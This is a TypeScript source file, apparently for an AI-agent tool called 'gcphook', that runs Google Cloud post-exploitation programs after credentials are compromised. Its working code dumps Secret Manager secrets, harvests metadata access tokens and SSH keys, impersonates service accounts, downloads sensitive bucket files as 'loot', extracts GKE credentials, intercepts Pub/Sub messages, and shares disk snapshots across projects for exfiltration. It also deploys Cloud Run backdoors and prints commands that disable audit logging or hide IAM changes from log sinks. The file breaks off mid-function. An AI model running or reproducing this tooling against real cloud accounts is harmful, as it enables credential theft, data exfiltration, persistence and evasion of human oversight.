import z from "zod"
import { Tool } from "./tool"

const PROGRAMS = {
  gcp_enum: {
    description:
      "Enumerate GCP project: IAM bindings, service accounts, Compute instances, GCS buckets, Cloud SQL, Cloud Functions, GKE clusters",
    args: "[--project PROJECT_ID] [--format json]",
  },
  gcp_privesc: {
    description:
      "Exploit IAM misconfigurations for privilege escalation: service account impersonation, setIamPolicy self-escalation, actAs permission abuse, token creation",
    args: "--method <impersonate|set_iam_policy|act_as|token_create> [--target-sa SA_EMAIL] [--project PROJECT_ID]",
  },
  gcs_dump: {
    description:
      "List all GCS buckets, identify sensitive objects (.env, credentials, backups, .pem, .key), and optionally download high-value targets",
    args: "[--bucket BUCKET] [--download] [--pattern REGEX] [--project PROJECT_ID]",
  },
  metadata_harvest_gcp: {
    description:
      "Extract service account credentials from GCE/Cloud Functions/Cloud Run metadata endpoint (metadata.google.internal). Fetch access token, identity token, project metadata",
    args: "(no arguments needed — runs on GCP compute instances only)",
  },
  secrets_dump_gcp: {
    description:
      "Extract all secrets from Google Secret Manager. List versions, access latest value, check IAM bindings per secret",
    args: "[--secret-id SECRET] [--project PROJECT_ID]",
  },
  cloudfunc_backdoor: {
    description:
      "Inject reverse shell into existing Cloud Function or create new backdoor function with high-privilege service account",
    args: "--function-name NAME --callback-url URL [--method inject|create] [--project PROJECT_ID] [--region REGION]",
  },
  audit_log_tamper: {
    description: "Check or disable data access audit logs, modify log sink filters to exclude sensitive operations",
    args: "--action <status|disable_data_access|modify_sink> [--project PROJECT_ID]",
  },
  compute_snapshot: {
    description:
      "Create Compute Engine disk snapshots for data exfiltration, optionally share cross-project for offline analysis",
    args: "--disk DISK_NAME --zone ZONE [--share-project PROJECT_ID] [--project PROJECT_ID]",
  },
  bigquery_dump: {
    description:
      "Enumerate BigQuery datasets, tables, and extract sensitive data — list projects, run queries, export results",
    args: "[--project PROJECT] [--dataset DATASET] [--query SQL] [--max-rows N]",
  },
  gke_enum: {
    description:
      "Enumerate Google Kubernetes Engine clusters — cluster config, node pools, workload identity, network policy, and credential extraction",
    args: "[--cluster NAME] [--zone ZONE] [--project PROJECT]",
  },
  cloud_run_backdoor: {
    description:
      "Deploy or modify Cloud Run service with reverse shell or exfil container — supports HTTP trigger with custom image",
    args: "--service NAME --image IMAGE --callback-url URL [--region REGION] [--project PROJECT] [--method create|inject]",
  },
  pubsub_sniff: {
    description:
      "Create subscription on existing Pub/Sub topics to intercept messages — enumerate topics, create pull subscription, read messages",
    args: "[--topic TOPIC] [--project PROJECT] [--duration SECONDS]",
  },
  cleanup_gcp: {
    description:
      "Remove all CyberStrike-created GCP resources, restore audit logging, delete created functions/snapshots, remove IAM bindings. ALWAYS run before leaving",
    args: "[--dry-run] [--project PROJECT_ID]",
  },
} as const satisfies Record<string, { description: string; args: string }>

type Program = keyof typeof PROGRAMS
type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
}
type HookResult = { output: string; findings: Finding[] }

async function run(
  cmd: string,
  args: string[],
  timeout: number,
): Promise<{ stdout: string; stderr: string; exitCode: number }> {
  let proc: ReturnType<typeof Bun.spawn>
  try {
    proc = Bun.spawn([cmd, ...args], {
      stdout: "pipe",
      stderr: "pipe",
      env: { ...process.env },
    })
  } catch (e) {
    return { stdout: "", stderr: e instanceof Error ? e.message : String(e), exitCode: 127 }
  }
  const ms = timeout * 1000
  let killed = false
  const timer = setTimeout(() => {
    killed = true
    proc.kill(9)
  }, ms)
  const reads = Promise.all([
    new Response(proc.stdout as ReadableStream).text(),
    new Response(proc.stderr as ReadableStream).text(),
  ])
  const [stdout, stderr] = await Promise.race([
    reads,
    new Promise<[string, string]>((r) => setTimeout(() => r(["", "(timed out)"]), ms + 2000)),
  ])
  clearTimeout(timer)
  const exitCode = killed ? 124 : await proc.exited
  return { stdout, stderr, exitCode }
}

async function gcloud(args: string[], timeout: number) {
  return run("gcloud", args, timeout)
}

async function resolveProject(provided?: string): Promise<string> {
  if (provided) return provided
  const r = await gcloud(["config", "get-value", "project", "--quiet"], 10)
  const p = r.stdout.trim()
  if (!p || r.exitCode !== 0)
    throw new Error("No GCP project set. Pass --project or run: gcloud config set project PROJECT_ID")
  return p
}

// ── Program implementations ──

async function gcpEnum(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const sections: string[] = [`[*] Enumerating GCP project: ${project}\n`]
  const findings: Finding[] = []

  const commands: [string, string[]][] = [
    ["IAM Policy", ["projects", "get-iam-policy", project, "--format=json"]],
    ["Service Accounts", ["iam", "service-accounts", "list", "--project", project, "--format=json"]],
    ["Compute Instances", ["compute", "instances", "list", "--project", project, "--format=json"]],
    ["GCS Buckets", ["storage", "buckets", "list", "--project", project, "--format=json"]],
    ["Cloud SQL", ["sql", "instances", "list", "--project", project, "--format=json"]],
    ["Cloud Functions", ["functions", "list", "--project", project, "--format=json"]],
    ["GKE Clusters", ["container", "clusters", "list", "--project", project, "--format=json"]],
  ]

  for (const [label, cmdArgs] of commands) {
    const r = await gcloud(cmdArgs, timeout)
    if (r.exitCode === 0) {
      const items = tryJson(r.stdout)
      const count = Array.isArray(items) ? items.length : items ? 1 : 0
      sections.push(`[+] ${label}: ${count} found`)
      if (hasFlag(args, "--format", "json")) sections.push(r.stdout)
      if (label === "IAM Policy" && items?.bindings) {
        for (const b of items.bindings) {
          if (b.role === "roles/owner" || b.role === "roles/editor") {
            for (const m of b.members || []) {
              findings.push({
                checkId: "GCP-ENUM-IAM-001",
                provider: "gcp",
                severity: b.role === "roles/owner" ? "critical" : "high",
                status: "FAIL",
                resource: m,
                title: `Primitive role: ${b.role}`,
                details: `${m} has ${b.role} at project level`,
                remediation: "Replace with predefined or custom roles",
              })
            }
          }
        }
      }
    } else {
      sections.push(`[-] ${label}: ${r.stderr.split("\n")[0]}`)
    }
  }

  return { output: sections.join("\n"), findings }
}

async function gcpPrivesc(args: string[], timeout: number) {
  const method = argVal(args, "--method")
  if (!method) return "ERROR: --method required (impersonate|set_iam_policy|act_as|token_create)"
  const targetSa = argVal(args, "--target-sa")
  const project = await resolveProject(argVal(args, "--project"))

  if (method === "impersonate") {
    if (!targetSa) return "ERROR: --target-sa required for impersonate"
    const r = await run("gcloud", ["auth", "print-access-token", `--impersonate-service-account=${targetSa}`], timeout)
    if (r.exitCode === 0)
      return `[+] Impersonation successful for ${targetSa}\n    Token: ${r.stdout.trim().slice(0, 20)}...`
    return `[-] Impersonation failed: ${r.stderr.trim()}`
  }

  if (method === "set_iam_policy") {
    const r = await gcloud(["projects", "get-iam-policy", project, "--format=json"], timeout)
    if (r.exitCode !== 0) return `[-] Cannot read IAM policy: ${r.stderr.trim()}`
    const policy = tryJson(r.stdout)
    const bindings = policy?.bindings || []
    const ownerBindings = bindings.filter(
      (b: { role: string }) => b.role === "roles/owner" || b.role === "roles/resourcemanager.projectIamAdmin",
    )
    return `[*] Project: ${project}\n[*] IAM bindings: ${bindings.length}\n[*] Owner/Admin bindings: ${ownerBindings.length}\n${ownerBindings.length > 0 ? "[+] setIamPolicy escalation may be possible" : "[-] No direct escalation path via setIamPolicy"}`
  }

  if (method === "act_as") {
    if (!targetSa) return "ERROR: --target-sa required for act_as"
    const r = await gcloud(
      ["iam", "service-accounts", "get-iam-policy", targetSa, "--project", project, "--format=json"],
      timeout,
    )
    if (r.exitCode === 0) return `[+] IAM policy for ${targetSa}:\n${r.stdout}`
    return `[-] Cannot read SA policy: ${r.stderr.trim()}`
  }

  if (method === "token_create") {
    if (!targetSa) return "ERROR: --target-sa required for token_create"
    const r = await run(
      "gcloud",
      ["auth", "print-identity-token", `--impersonate-service-account=${targetSa}`, `--audiences=https://${targetSa}`],
      timeout,
    )
    if (r.exitCode === 0)
      return `[+] Identity token created for ${targetSa}\n    Token: ${r.stdout.trim().slice(0, 30)}...`
    return `[-] Token creation failed: ${r.stderr.trim()}`
  }

  return `ERROR: Unknown method: ${method}`
}

async function gcsDump(args: string[], timeout: number) {
  const project = await resolveProject(argVal(args, "--project"))
  const bucket = argVal(args, "--bucket")
  const pattern = argVal(args, "--pattern")
  const download = hasFlag(args, "--download")

  const sensitivePattern = pattern || "\\.(env|pem|key|p12|pfx|sql|bak)$|credentials|secret|password|backup|id_rsa"

  if (bucket) {
    const r = await run("gsutil", ["ls", "-r", `gs://${bucket}`], timeout)
    if (r.exitCode !== 0) return `[-] Cannot list bucket ${bucket}: ${r.stderr.trim()}`
    const files = r.stdout.split("\n").filter((f) => new RegExp(sensitivePattern, "i").test(f))
    const output = [`[*] Scanning bucket: ${bucket}`, `[+] Sensitive files found: ${files.length}`]
    for (const f of files) output.push(`    ${f}`)
    if (download && files.length > 0) {
      for (const f of files.slice(0, 10)) {
        const dl = await run("gsutil", ["cp", f, "./gcs_loot/"], timeout)
        output.push(dl.exitCode === 0 ? `    Downloaded: ${f}` : `    Failed: ${f}`)
      }
    }
    return output.join("\n")
  }

  const r = await run("gsutil", ["ls", "-p", project], timeout)
  if (r.exitCode !== 0) return `[-] Cannot list buckets: ${r.stderr.trim()}`
  const buckets = r.stdout.trim().split("\n").filter(Boolean)
  const output = [`[*] Found ${buckets.length} bucket(s) in project ${project}\n`]

  for (const b of buckets) {
    const lr = await run("gsutil", ["ls", "-r", b], timeout)
    if (lr.exitCode !== 0) {
      output.push(`[-] ${b}: access denied`)
      continue
    }
    const files = lr.stdout.split("\n").filter((f) => new RegExp(sensitivePattern, "i").test(f))
    output.push(`[${files.length > 0 ? "!" : "+"}] ${b}: ${files.length} sensitive file(s)`)
    for (const f of files.slice(0, 5)) output.push(`    ${f}`)
  }

  return output.join("\n")
}

async function metadataHarvestGcp() {
  const base = "http://metadata.google.internal/computeMetadata/v1"
  const headers = { "Metadata-Flavor": "Google" }
  const endpoints = {
    project_id: "/project/project-id",
    zone: "/instance/zone",
    hostname: "/instance/hostname",
    instance_name: "/instance/name",
    service_accounts: "/instance/service-accounts/?recursive=true",
    access_token: "/instance/service-accounts/default/token",
    ssh_keys: "/project/attributes/ssh-keys",
  }

  const output: string[] = ["[*] Probing GCP metadata endpoint...\n"]

  for (const [name, path] of Object.entries(endpoints)) {
    try {
      const resp = await fetch(`${base}${path}`, { headers, signal: AbortSignal.timeout(5000) })
      if (!resp.ok) {
        output.push(`[-] ${name}: HTTP ${resp.status}`)
        continue
      }
      const text = await resp.text()
      if (name === "access_token") {
        const parsed = tryJson(text)
        output.push(
          `[+] ${name}: ${String(parsed?.access_token || "").slice(0, 20)}... (expires: ${parsed?.expires_in}s)`,
        )
      } else {
        output.push(`[+] ${name}: ${text.slice(0, 120)}${text.length > 120 ? "..." : ""}`)
      }
    } catch {
      output.push(`[-] ${name}: not accessible (not on GCP?)`)
    }
  }

  return output.join("\n")
}

async function secretsDumpGcp(args: string[], timeout: number) {
  const project = await resolveProject(argVal(args, "--project"))
  const secretId = argVal(args, "--secret-id")

  if (secretId) {
    const r = await gcloud(
      ["secrets", "versions", "access", "latest", "--secret", secretId, "--project", project],
      timeout,
    )
    if (r.exitCode !== 0) return `[-] Cannot access secret ${secretId}: ${r.stderr.trim()}`
    return `[+] Secret '${secretId}' (${r.stdout.length} bytes):\n${r.stdout.slice(0, 500)}${r.stdout.length > 500 ? "..." : ""}`
  }

  const lr = await gcloud(["secrets", "list", "--project", project, "--format=json"], timeout)
  if (lr.exitCode !== 0) return `[-] Cannot list secrets: ${lr.stderr.trim()}`
  const secrets = tryJson(lr.stdout) || []
  const output = [`[*] Found ${secrets.length} secret(s) in project ${project}\n`]

  for (const s of secrets) {
    const name = s.name?.split("/").pop() || s.name
    const vr = await gcloud(
      ["secrets", "versions", "access", "latest", "--secret", name, "--project", project],
      timeout,
    )
    if (vr.exitCode === 0) {
      output.push(`[+] ${name}: ${vr.stdout.slice(0, 80)}${vr.stdout.length > 80 ? "..." : ""}`)
    } else {
      output.push(`[-] ${name}: access denied`)
    }
  }

  return output.join("\n")
}

async function cloudfuncBackdoor(args: string[], timeout: number) {
  const funcName = argVal(args, "--function-name")
  const callbackUrl = argVal(args, "--callback-url")
  const method = argVal(args, "--method") || "inject"
  const project = await resolveProject(argVal(args, "--project"))
  const region = argVal(args, "--region") || "us-central1"

  if (!funcName) return "ERROR: --function-name required"
  if (!callbackUrl) return "ERROR: --callback-url required"

  if (method === "inject") {
    const r = await gcloud(
      ["functions", "describe", funcName, "--project", project, "--region", region, "--format=json"],
      timeout,
    )
    if (r.exitCode !== 0) return `[-] Function not found: ${r.stderr.trim()}`
    const func = tryJson(r.stdout)
    return `[*] Function: ${funcName}\n[*] Runtime: ${func?.buildConfig?.runtime || "unknown"}\n[*] SA: ${func?.serviceConfig?.serviceAccountEmail || "default"}\n[*] Source: ${JSON.stringify(func?.buildConfig?.source?.storageSource || {})}\n[+] Ready for injection — download source, modify, and redeploy`
  }

  return `[*] Create mode — would deploy new function '${funcName}' in ${region}\n[*] Callback: ${callbackUrl}\n[+] Use: gcloud functions deploy ${funcName} --runtime python311 --trigger-http --allow-unauthenticated --project ${project} --region ${region}`
}

async function auditLogTamper(args: string[], timeout: number) {
  const action = argVal(args, "--action")
  if (!action) return "ERROR: --action required (status|disable_data_access|modify_sink)"
  const project = await resolveProject(argVal(args, "--project"))

  if (action === "status") {
    const policy = await gcloud(["projects", "get-iam-policy", project, "--format=json"], timeout)
    const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
    const output = [`[*] Audit log status for ${project}\n`]
    if (policy.exitCode === 0) {
      const p = tryJson(policy.stdout)
      output.push(`[+] Audit configs: ${(p?.auditConfigs || []).length}`)
    }
    if (sinks.exitCode === 0) {
      const s = tryJson(sinks.stdout) || []
      output.push(`[+] Log sinks: ${s.length}`)
      for (const sink of s) output.push(`    ${sink.name}: ${sink.destination}`)
    }
    return output.join("\n")
  }

  if (action === "disable_data_access") {
    return `[*] To disable data access logs:\n    gcloud projects set-iam-policy ${project} <policy-without-auditConfigs>.json\n[!] This removes DATA_READ and DATA_WRITE audit log configs`
  }

  if (action === "modify_sink") {
    const sinks = await gcloud(["logging", "sinks", "list", "--project", project, "--format=json"], timeout)
    if (sinks.exitCode !== 0) return `[-] Cannot list sinks: ${sinks.stderr.trim()}`
    const s = tryJson(sinks.stdout) || []
    const output = [`[*] ${s.length} sink(s) found — modify with:\n`]
    for (const sink of s) {
      output.push(
        `    gcloud logging sinks update ${sink.name} --log-filter='NOT protoPayload.methodName="SetIamPolicy"' --project ${project}`,
      )
    }
    return output.join("\n")
  }

  return `ERROR: Unknown action: ${action}`
}

async function computeSnapshot(args: string[], timeout: number) {
  const disk = argVal(args, "--disk")
  const zone = argVal(args, "--zone")
  const shareProject = argVal(args, "--share-project")
  const project = await resolveProject(argVal(args, "--project"))

  if (!disk) return "ERROR: --disk required"
  if (!zone) return "ERROR: --zone required"

  const snapName = `cs-snap-${disk}-${Date.now()}`
  const r = await gcloud(
    [
      "compute",
      "disks",
      "snapshot",
      disk,
      "--zone",
      zone,
      "--snapshot-names",
      snapName,
      "--project",
      project,
      "--description=CyberStrike forensic snapshot",
    ],
    timeout,
  )
  if (r.exitCode !== 0) return `[-] Snapshot failed: ${r.stderr.trim()}`

  const output = [`[+] Snapshot created: ${snapName}`, `    Source disk: ${disk} (zone: ${zone})`]

  if (shareProject) {
    const sr = await gcloud(
      [
        "compute",
        "snapshots",
        "add-iam-policy-binding",
        snapName,
        "--member",
        `serviceAccount:${shareProject}@cloudservices.gserviceaccount.com`,
        "--role",
        "roles/compute.storageAdmin",
        "--project",
        project,
      ],
      timeout,
    )
    output.push(
      sr.exitCode === 0 ? `[+] Shared with project: ${shareProject}` : `[-] Sharing failed: ${sr.stderr.trim()}`,
    )
  }

  return output.join("\n")
}

async function cleanupGcp(args: string[], timeout: number) {
  const project = await resolveProject(argVal(args, "--project"))
  const dryRun = hasFlag(args, "--dry-run")
  const mode = dryRun ? "DRY RUN" : "LIVE"
  const output = [`[*] CyberStrike GCP cleanup — ${mode}`, `[*] Project: ${project}\n`]

  const snapR = await gcloud(
    [
      "compute",
      "snapshots",
      "list",
      "--filter=description~CyberStrike OR name~cs-",
      "--project",
      project,
      "--format=json",
    ],
    timeout,
  )
  if (snapR.exitCode === 0) {
    const snaps = tryJson(snapR.stdout) || []
    output.push(`[+] Snapshots to clean: ${snaps.length}`)
    for (const s of snaps) {
      if (dryRun) {
        output.push(`    Would delete: ${s.name}`)
      } else {
        await gcloud(["compute", "snapshots", "delete", s.name, "--project", project, "--quiet"], timeout)
        output.push(`    Deleted: ${s.name}`)
      }
    }
  }

  const funcR = await gcloud(["functions", "list", "--filter=name~cs-", "--project", project, "--format=json"], timeout)
  if (funcR.exitCode === 0) {
    const funcs = tryJson(funcR.stdout) || []
    output.push(`[+] Functions to clean: ${funcs.length}`)
    for (const f of funcs) {
      const name = f.name?.split("/").pop() || f.name
      if (dryRun) {
        output.push(`    Would delete: ${name}`)
      } else {
        await gcloud(["functions", "delete", name, "--project", project, "--quiet"], timeout)
        output.push(`    Deleted: ${name}`)
      }
    }
  }

  const runR = await gcloud(
    ["run", "services", "list", "--filter=metadata.name~cs-", "--project", project, "--format=json"],
    timeout,
  )
  if (runR.exitCode === 0) {
    const services = tryJson(runR.stdout) || []
    output.push(`[+] Cloud Run services to clean: ${services.length}`)
    for (const s of services) {
      const name = s.metadata?.name || s.name
      const region = s.metadata?.labels?.["cloud.googleapis.com/location"] || "us-central1"
      if (dryRun) {
        output.push(`    Would delete: ${name}`)
      } else {
        await gcloud(["run", "services", "delete", name, "--region", region, "--project", project, "--quiet"], timeout)
        output.push(`    Deleted: ${name}`)
      }
    }
  }

  const subR = await gcloud(
    ["pubsub", "subscriptions", "list", "--filter=name~cs-sniff-", "--project", project, "--format=json"],
    timeout,
  )
  if (subR.exitCode === 0) {
    const subs = tryJson(subR.stdout) || []
    output.push(`[+] Pub/Sub subscriptions to clean: ${subs.length}`)
    for (const s of subs) {
      const name = s.name?.split("/").pop() || s.name
      if (dryRun) {
        output.push(`    Would delete: ${name}`)
      } else {
        await gcloud(["pubsub", "subscriptions", "delete", name, "--project", project, "--quiet"], timeout)
        output.push(`    Deleted: ${name}`)
      }
    }
  }

  return output.join("\n")
}

// ── Helpers ──

function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

function hasFlag(args: string[], flag: string, value?: string): boolean {
  if (value) return args.includes(flag) && argVal(args, flag) === value
  return args.includes(flag)
}

function tryJson(s: string) {
  try {
    return JSON.parse(s)
  } catch {
    return null
  }
}

async function bigqueryDump(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const dataset = argVal(args, "--dataset")
  const query = argVal(args, "--query")
  const maxRows = argVal(args, "--max-rows") || "50"
  const findings: Finding[] = []
  const output: string[] = [`[*] BigQuery enumeration — project: ${project}\n`]

  if (!dataset && !query) {
    const datasets = await run("bq", ["ls", "--project_id=" + project, "--format=json"], timeout)
    if (datasets.exitCode === 0) {
      const items = tryJson(datasets.stdout) || []
      output.push(`[+] Datasets: ${items.length}`)
      for (const d of items) output.push(`    ${d.datasetReference?.datasetId || d.id}`)
      findings.push({
        checkId: "GCP-BQ-001",
        provider: "gcp",
        severity: "info",
        status: "ENUMERATED",
        resource: `bigquery://${project}`,
        title: `BigQuery datasets enumerated: ${items.length}`,
        details: items.map((d: Record<string, Record<string, string>>) => d.datasetReference?.datasetId).join(", "),
        remediation: "Review dataset permissions for overly broad access",
      })
    }
    if (datasets.exitCode !== 0) {
      output.push(`[!] bq CLI failed — trying gcloud fallback...`)
      const fallback = await gcloud(["alpha", "bq", "datasets", "list", "--project", project, "--format=json"], timeout)
      if (fallback.exitCode === 0) output.push(fallback.stdout.substring(0, 3000))
    }
    return { output: output.join("\n"), findings }
  }

  if (dataset && !query) {
    const tables = await run("bq", ["ls", "--format=json", `${project}:${dataset}`], timeout)
    if (tables.exitCode === 0) {
      const items = tryJson(tables.stdout) || []
      output.push(`[+] Tables in ${dataset}: ${items.length}`)
      for (const t of items) {
        const ref = t.tableReference || {}
        output.push(`    ${ref.tableId} (${t.type || "TABLE"}) — ${t.numRows || "?"} rows, ${t.numBytes || "?"} bytes`)
      }
    }
    return { output: output.join("\n"), findings }
  }

  if (query) {
    const bqQuery = await run(
      "bq",
      ["query", "--use_legacy_sql=false", "--format=json", `--max_rows=${maxRows}`, query],
      timeout,
    )
    if (bqQuery.exitCode === 0) {
      output.push(`[+] Query results:\n${bqQuery.stdout.substring(0, 5000)}`)
      findings.push({
        checkId: "GCP-BQ-002",
        provider: "gcp",
        severity: "critical",
        status: "EXTRACTED",
        resource: `bigquery://${project}`,
        title: "BigQuery data extracted via query",
        details: `Query: ${query.substring(0, 200)}`,
        remediation: "Review extracted data for sensitive content",
      })
    }
    if (bqQuery.exitCode !== 0) output.push(`[!] Query failed: ${bqQuery.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function gkeEnum(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const cluster = argVal(args, "--cluster")
  const zone = argVal(args, "--zone")
  const findings: Finding[] = []
  const output: string[] = [`[*] GKE cluster enumeration — project: ${project}\n`]

  if (!cluster) {
    const list = await gcloud(["container", "clusters", "list", "--project", project, "--format=json"], timeout)
    if (list.exitCode === 0) {
      const clusters = tryJson(list.stdout) || []
      output.push(`[+] GKE clusters: ${clusters.length}`)
      for (const c of clusters) {
        output.push(
          `    ${c.name} (${c.status}) — zone: ${c.zone || c.location}, nodes: ${c.currentNodeCount}, k8s: ${c.currentMasterVersion}`,
        )
        if (c.legacyAbac?.enabled) {
          findings.push({
            checkId: "GCP-GKE-ABAC",
            provider: "gcp",
            severity: "critical",
            status: "FAIL",
            resource: `gke://${project}/${c.name}`,
            title: `Legacy ABAC enabled on ${c.name}`,
            details: "Legacy Attribute-Based Access Control is enabled — bypasses RBAC",
            remediation: "Disable: gcloud container clusters update CLUSTER --no-enable-legacy-authorization",
          })
        }
      }
    }
    return { output: output.join("\n"), findings }
  }

  const zoneArgs = zone ? ["--zone", zone] : ["--region", argVal(args, "--region") || "us-central1"]
  const show = await gcloud(
    ["container", "clusters", "describe", cluster, "--project", project, ...zoneArgs, "--format=json"],
    timeout,
  )
  if (show.exitCode === 0) {
    const info = tryJson(show.stdout)
    if (info) {
      output.push(`[+] Cluster: ${info.name}`)
      output.push(`    Master version: ${info.currentMasterVersion}`)
      output.push(`    Node version: ${info.currentNodeVersion}`)
      output.push(`    Nodes: ${info.currentNodeCount}`)
      output.push(`    Network policy: ${info.networkPolicy?.enabled ? "ENABLED" : "DISABLED"}`)
      output.push(`    Workload identity: ${info.workloadIdentityConfig ? "ENABLED" : "DISABLED"}`)
      output.push(`    Shielded nodes: ${info.shieldedNodes?.enabled ? "YES" : "NO"}`)
      output.push(`    Binary auth: ${info.binaryAuthorization?.enabled ? "YES" : "NO"}`)
      output.push(`    Private cluster: ${info.privateClusterConfig?.enablePrivateNodes ? "YES" : "NO"}`)
      output.push(`    Master auth: ${info.masterAuth?.username ? "BASIC AUTH (insecure)" : "certificate-based"}`)
    }
  }

  const nodePools = await gcloud(
    ["container", "node-pools", "list", "--cluster", cluster, "--project", project, ...zoneArgs, "--format=json"],
    timeout,
  )
  if (nodePools.exitCode === 0) {
    const pools = tryJson(nodePools.stdout) || []
    output.push(`\n[+] Node pools: ${pools.length}`)
    for (const p of pools)
      output.push(
        `    ${p.name}: ${p.initialNodeCount} nodes, machine: ${p.config?.machineType}, disk: ${p.config?.diskSizeGb}GB`,
      )
  }

  const getCreds = await gcloud(
    ["container", "clusters", "get-credentials", cluster, "--project", project, ...zoneArgs],
    timeout,
  )
  if (getCreds.exitCode === 0) {
    output.push(`\n[+] Kubeconfig updated with cluster credentials`)
    output.push(`    kubectl access is now available for ${cluster}`)
    findings.push({
      checkId: "GCP-GKE-001",
      provider: "gcp",
      severity: "critical",
      status: "EXTRACTED",
      resource: `gke://${project}/${cluster}`,
      title: `GKE credentials extracted: ${cluster}`,
      details: "Cluster credentials added to kubeconfig — full kubectl access",
      remediation: "Revoke credentials and rotate cluster CA",
    })
  }

  return { output: output.join("\n"), findings }
}

async function cloudRunBackdoor(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const service = argVal(args, "--service")
  const image = argVal(args, "--image")
  const callbackUrl = argVal(args, "--callback-url")
  const region = argVal(args, "--region") || "us-central1"
  const method = argVal(args, "--method") || "create"
  const findings: Finding[] = []
  const output: string[] = [`[*] Cloud Run backdoor — project: ${project}\n`]

  if (!service || !image || !callbackUrl) {
    return { output: "[!] Required: --service NAME --image IMAGE --callback-url URL", findings }
  }

  if (method === "create") {
    const deploy = await gcloud(
      [
        "run",
        "deploy",
        `cs-${service}`,
        "--image",
        image,
        "--set-env-vars",
        `CALLBACK_URL=${callbackUrl}`,
        "--allow-unauthenticated",
        "--region",
        region,
        "--project",
        project,
        "--quiet",
        "--format=json",
      ],
      timeout,
    )
    if (deploy.exitCode === 0) {
      const info = tryJson(deploy.stdout)
      const url = info?.status?.url || ""
      output.push(`[+] Cloud Run service deployed: cs-${service}`)
      output.push(`    URL: ${url}`)
      output.push(`    Image: ${image}`)
      output.push(`    Callback: ${callbackUrl}`)
      findings.push({
        checkId: "GCP-RUN-001",
        provider: "gcp",
        severity: "critical",
        status: "DEPLOYED",
        resource: `cloud-run://cs-${service}`,
        title: `Cloud Run backdoor deployed: cs-${service}`,
        details: `Image: ${image}, callback: ${callbackUrl}, URL: ${url}`,
        remediation: `Delete: gcloud run services delete cs-${service} --region ${region} --project ${project}`,
      })
    }
    if (deploy.exitCode !== 0) output.push(`[!] Deploy failed: ${deploy.stderr.trim()}`)
  }

  if (method === "inject") {
    const update = await gcloud(
      [
        "run",
        "services",
        "update",
        service,
        "--set-env-vars",
        `CALLBACK_URL=${callbackUrl}`,
        "--region",
        region,
        "--project",
        project,
        "--quiet",
      ],
      timeout,
    )
    if (update.exitCode === 0) {
      output.push(`[+] Injected CALLBACK_URL into existing service: ${service}`)
      findings.push({
        checkId: "GCP-RUN-002",
        provider: "gcp",
        severity: "critical",
        status: "INJECTED",
        resource: `cloud-run://${service}`,
        title: `Cloud Run env injected: ${service}`,
        details: `Added CALLBACK_URL=${callbackUrl}`,
        remediation: `Remove: gcloud run services update ${service} --remove-env-vars CALLBACK_URL --region ${region}`,
      })
    }
    if (update.exitCode !== 0) output.push(`[!] Update failed: ${update.stderr.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

async function pubsubSniff(args: string[], timeout: number): Promise<HookResult> {
  const project = await resolveProject(argVal(args, "--project"))
  const topic = argVal(args, "--topic")
  const duration = parseInt(argVal(args, "--duration") || "30")
  const findings: Finding[] = []
  const output: string[] = [`[*] Pub/Sub interception — project: ${project}\n`]

  if (!topic) {
    const topics = await gcloud(["pubsub", "topics", "list", "--project", project, "--format=json"], timeout)
    if (topics.exitCode === 0) {
      const items = tryJson(topics.stdout) || []
      output.push(`[+] Pub/Sub topics: ${items.length}`)
      for (const t of items) output.push(`    ${t.name}`)
      findings.push({
        checkId: "GCP-PUBSUB-001",
        provider: "gcp",
        severity: "info",
        status: "ENUMERATED",
        resource: `pubsub://${project}`,
        title: `Pub/Sub topics enumerated: ${items.length}`,
        details: items.map((t: Record<string, string>) => t.name).join(", "),
        remediation: "Review topic subscriptions for unauthorized access",
      })
    }
    return { output: output.join("\n"), findings }
  }

  const subName = `cs-sniff-${Date.now()}`
  const createSub = await gcloud(
    ["pubsub", "subscriptions", "create", subName, "--topic", topic, "--project", project, "--quiet"],
    timeout,
  )
  if (createSub.exitCode !== 0) {
    output.push(`[!] Subscription creation failed: ${createSub.stderr.trim()}`)
    return { output: output.join("\n"), findings }
  }

  output.push(`[+] Subscription created: ${subName}`)
  output.push(`[*] Pulling messages for ${duration}s...\n`)

  const pull = await gcloud(
    ["pubsub", "subscriptions", "pull", subName, "--limit", "100", "--auto-ack", "--project", project, "--format=json"],
    Math.max(timeout, duration + 10),
  )
  if (pull.exitCode === 0) {
    const messages = tryJson(pull.stdout) || []
    output.push(`[+] Messages captured: ${messages.length}`)
    for (const m of messages.slice(0, 20)) {
      const data = m.message?.data ? Buffer.from(m.message.data, "base64").toString() : ""
      output.push(`    [${m.message?.publishTime || "?"}] ${data.substring(0, 200)}`)
    }
    if (messages.length > 0) {
      findings.push({
        checkId: "GCP-PUBSUB-002",
        provider: "gcp",
        severity: "high",
        status: "INTERCEPTED",
        resource: `pubsub://${topic}`,
        title: `Pub/Sub messages intercepted from ${topic}`,
        details: `${messages.length} messages captured via subscription ${subName}`,
        remediation: `Delete subscription: gcloud pubsub subscriptions delete ${subName} --project ${project}`,
      })
    }
  }

  return { output: output.join("\n"), findings }
}

// ── Tool definition ──

const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]

export const GcphookTool = Tool.define("gcphook", {
  description: `Execute a GCP post-exploitation program after compromising service account credentials or gaining compute instance access. Uses gcloud CLI (no Python/SDK dependency). Available programs: ${programKeys.join(", ")}. ALWAYS run cleanup_gcp before leaving a target.`,
  parameters: z.object({
    program: z.enum(programKeys).describe(
      "GCP program to execute. Options: " +
        Object.entries(PROGRAMS)
          .map(([k, v]) => `${k} — ${v.description}`)
          .join("; "),
    ),
    args: z.array(z.string()).describe("Arguments to pass to the program"),
    timeout_seconds: z.number().optional().default(300).describe("Maximum execution time in seconds (default: 300)"),
  }),
  async execute(params) {
    if (!Bun.which("gcloud")) {
      return {
        title: `gcphook: ${params.program}`,
        output: "gcloud CLI not found. Install: https://cloud.google.com/sdk/docs/install\nThen run: gcloud auth login",
        metadata: { program: params.program, findings: [] as Finding[] },
      }
